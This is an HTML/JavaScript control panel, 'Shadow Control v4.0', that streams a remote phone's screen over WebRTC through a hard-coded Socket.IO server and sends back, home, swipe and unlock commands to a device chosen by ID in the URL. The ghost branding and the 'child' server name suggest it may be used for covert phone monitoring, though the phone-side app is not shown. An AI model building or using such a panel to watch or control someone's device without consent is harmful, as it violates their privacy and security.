<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Shadow Control v4.0 (Stable)</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

    <style>
        :root {
            --bg-dark: #050505;
            --panel-glass: rgba(20, 25, 35, 0.9);
            --accent: #00f3ff;
            --danger: #ff2a6d;
            --border: 1px solid rgba(255, 255, 255, 0.12);
            --text-color: #e0e6ed;
        }

        * { box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }

        body {
            margin: 0; background-color: var(--bg-dark); color: var(--text-color);
            font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        .top-bar {
            height: 55px; padding: 0 20px; background: rgba(10, 10, 15, 0.9); border-bottom: var(--border);
            display: flex; justify-content: space-between; align-items: center; z-index: 100;
        }

        .brand { font-size: 1.4rem; font-weight: 700; color: var(--accent); letter-spacing: 2px; }

        .status-pill {
            background: rgba(255,255,255,0.05); padding: 5px 12px; border-radius: 50px; border: var(--border);
            display: flex; align-items: center; gap: 8px; font-size: 0.8rem;
        }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); }
        .dot.online { background: #00ff88; box-shadow: 0 0 8px #00ff88; }

        .main-container { flex: 1; display: flex; overflow: hidden; position: relative; }

        .video-wrapper {
            flex: 1; background: #000; position: relative; display: flex; justify-content: center; align-items: center;
        }

        video { width: 100%; height: 100%; object-fit: contain; background: black; }

        .overlay-msg {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center; color: white; z-index: 10;
        }

        .sidebar {
            width: 300px; background: var(--panel-glass); border-left: var(--border);
            padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow-y: auto;
        }

        .control-group { background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); }
        .group-title { color: var(--accent); font-size: 0.7rem; text-transform: uppercase; margin-bottom: 5px; font-weight: bold; }
        
        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
        .btn {
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.05); color: #ccc;
            padding: 10px 0; border-radius: 5px; cursor: pointer; display: flex; flex-direction: column; align-items: center;
        }
        .btn:active { background: var(--accent); color: black; }
        .btn-large { grid-column: span 3; background: rgba(0, 243, 255, 0.1); color: white; font-weight: bold; }

        @media (max-width: 800px) {
            .main-container { flex-direction: column; }
            .sidebar { width: 100%; height: 40%; border-left: none; border-top: var(--border); }
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="brand"><i class="fa-solid fa-ghost"></i> Shadow V4</div>
        <div class="status-pill">
            <div id="statusDot" class="dot"></div>
            <span id="statusText">Disconnected</span>
        </div>
    </div>

    <div class="main-container">
        <div class="video-wrapper">
            <div class="overlay-msg" id="loadingOverlay">
                <i class="fa-solid fa-satellite-dish fa-3x"></i>
                <h3 style="margin:10px 0;">WAITING FOR SIGNAL</h3>
                <p id="debugText" style="color:#888; font-size: 12px;">Initializing...</p>
            </div>
            <video id="remoteVideo" autoplay playsinline muted controls></video>
        </div>

        <div class="sidebar">
            <div class="control-group">
                <div class="group-title">Connection</div>
                <button class="btn btn-large" onclick="requestStream()">
                    <i class="fa-solid fa-play"></i> START STREAM
                </button>
            </div>

            <div class="control-group">
                <div class="group-title">Navigation</div>
                <div class="btn-grid">
                    <button class="btn" onclick="sendCmd('back')"><i class="fa-solid fa-chevron-left"></i> BACK</button>
                    <button class="btn" onclick="sendCmd('home')"><i class="fa-regular fa-circle"></i> HOME</button>
                    <button class="btn" onclick="sendCmd('recent')"><i class="fa-regular fa-square"></i> APPS</button>
                </div>
            </div>

            <div class="control-group">
                <div class="group-title">Gestures</div>
                <div class="btn-grid">
                    <button class="btn" onclick="sendCmd('swipe_up')"><i class="fa-solid fa-arrow-up"></i> UP</button>
                    <button class="btn" onclick="sendCmd('swipe_down')"><i class="fa-solid fa-arrow-down"></i> DOWN</button>
                    <button class="btn" onclick="sendCmd('unlock')"><i class="fa-solid fa-lock-open"></i> WAKE</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id'); // e.g. ?id=945428

        // --- DOM ELEMENTS ---
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        const debugText = document.getElementById('debugText');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const remoteVideo = document.getElementById('remoteVideo');

        let socket = null;
        let peerConnection = null;

        const rtcConfig = {
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        };

        // --- INITIALIZATION ---
        if (!DEVICE_ID) {
            debugText.innerText = "ERROR: Missing Device ID in URL";
            alert("URL me ID nahi hai! (?id=XXXX)");
        } else {
            initSocket();
        }

        function initSocket() {
            debugText.innerText = "Connecting to Server...";
            
            // Socket connect karo (WebSocket mode only for stability)
            socket = io(SERVER_URL, { transports: ['websocket'] });

            socket.on("connect", () => {
                setStatus(true, "Server Connected");
                debugText.innerText = `Joined Room: ${DEVICE_ID}`;
                socket.emit("join-room", DEVICE_ID);
            });

            socket.on("disconnect", () => {
                setStatus(false, "Disconnected");
                debugText.innerText = "Lost connection to server";
            });

            // --- WEBRTC LOGIC ---
            socket.on("offer", async (data) => {
                console.log("ðŸ“¡ Offer Received!");
                debugText.innerText = "Offer Received! Negotiating...";
                
                if (peerConnection) peerConnection.close();
                peerConnection = new RTCPeerConnection(rtcConfig);

                peerConnection.ontrack = (event) => {
                    console.log("ðŸŽ¥ Stream Found!");
                    debugText.innerText = "Stream Active";
                    loadingOverlay.style.display = "none"; // Hide Overlay
                    remoteVideo.srcObject = event.streams[0];
                    remoteVideo.play().catch(e => console.log("Press play manually"));
                };

                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit("candidate", { target: DEVICE_ID, candidate: event.candidate });
                    }
                };

                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer || data));
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);

                socket.emit("answer", { target: DEVICE_ID, answer: answer });
                debugText.innerText = "Sent Answer. Waiting for Video...";
            });

            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate || data));
                    } catch (e) { console.error(e); }
                }
            });
        }

        // --- USER ACTIONS ---
        function requestStream() {
            if (!socket || !socket.connected) {
                alert("Server se connect nahi hai!");
                return;
            }
            debugText.innerText = "Requesting Stream...";
            // Phone ko bolo "Start" karne ko
            // Note: Phone app me ye event handle hona chahiye
            socket.emit("control-event", { room: DEVICE_ID, action: "start" });
        }

        function sendCmd(action) {
            if (socket && socket.connected) {
                socket.emit("control-event", { room: DEVICE_ID, action: action });
            }
        }

        function setStatus(online, text) {
            statusDot.className = online ? "dot online" : "dot";
            statusText.innerText = text;
        }
    </script>
</body>
</html>
